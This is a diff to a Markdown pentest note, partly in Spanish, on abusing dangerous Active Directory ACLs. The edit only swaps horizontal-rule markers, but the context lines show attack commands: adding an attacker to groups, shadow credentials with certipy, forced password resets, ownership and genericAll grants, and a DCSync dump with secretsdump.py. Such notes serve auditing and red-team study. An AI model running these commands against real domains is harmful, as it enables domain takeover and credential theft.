@@ -17,7 +17,7 @@ linked:
 ---
 # AD - ACL Enumeration - Dangerous ACE Patterns
 
-***
+---
 
 ## GenericAll (Full Control)
 
@@ -45,7 +45,7 @@ Add-ADGroupMember <group> -Members <atacante>
 bloodyAD --host <DC> -d corp -u atacante -p pass add groupMember <group> <atacante>
 ```
 
-___
+---
 
 ## GenericWrite
 
@@ -71,7 +71,7 @@ certipy shadow auto -u atacante -p pass -account <victim> -dc-ip <DC>
 Set-ADComputer <target-computer> -PrincipalsAllowedToDelegateToAccount <atacante-computer>
 ```
 
-___
+---
 
 ## WriteDACL
 
@@ -103,7 +103,7 @@ Set-ADAccountPassword -Identity <victim> -Reset -NewPassword ...
 bloodyAD --host <DC> -d corp -u atacante -p pass add genericAll <victim> atacante
 ```
 
-___
+---
 
 ## WriteOwner
 
@@ -133,7 +133,7 @@ bloodyAD --host <DC> -d corp -u atacante -p pass set owner <victim> atacante
 bloodyAD --host <DC> -d corp -u atacante -p pass add genericAll <victim> atacante
 ```
 
-___
+---
 
 ## ForceChangePassword
 
@@ -162,7 +162,7 @@ bloodyAD --host <DC> -d corp -u atacante -p pass set password <victim> '<NewPass
 net rpc password '<victim>' '<NewPass!>' -U 'corp/atacante%pass' -S <DC>
 ```
 
-___
+---
 
 ## AddSelf / AddMember
 
@@ -183,7 +183,7 @@ bloodyAD --host <DC> -d corp -u atacante -p pass add groupMember <group> <atacan
 net rpc group addmem '<group>' '<atacante>' -U 'corp/atacante%pass' -S <DC>
 ```
 
-___
+---
 
 ## WriteProperty (Specific Attrs)
 
@@ -208,7 +208,7 @@ Get-Acl "AD:<victim-DN>" |
   }
 ```
 
-___
+---
 
 ## DCSync Rights
 
@@ -242,7 +242,7 @@ Get-Acl "AD:DC=corp,DC=local" |
 secretsdump.py corp.local/atacante:pass@<DC> -just-dc
 ```
 
-___
+---
 
 ## Other Dangerous ACEs
 
@@ -256,7 +256,7 @@ ___
 | `Recalculate-Hierarchy` | Edge | Rare. |
 ^ad-ace-other
 
-___
+---
 
 ## ACE Inheritance
 
@@ -269,4 +269,4 @@ ___
 
 **Por qué importa:** ACE en OU padre puede afectar todos los descendientes vía inheritance. Audit OU root + AdminSDHolder + Tier 0 OUs primero.
 
-***
+---
